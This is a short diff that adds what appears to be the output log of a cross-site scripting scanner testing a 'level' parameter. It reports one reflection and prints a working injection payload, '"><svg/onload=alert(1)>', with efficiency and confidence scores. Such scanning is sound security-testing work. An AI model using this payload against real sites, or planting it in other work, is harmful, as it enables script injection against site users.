@@ -1,0 +1,8 @@
+[INFO] Testing parameter: level
+[INFO] Reflections found: 1
+[INFO] Payloads generated: 8
+[RUN] Progress: 1/8
+
+[+] Payload: "><svg/onload=alert(1)>
+[INFO] Efficiency: 100
+[INFO] Confidence: 6
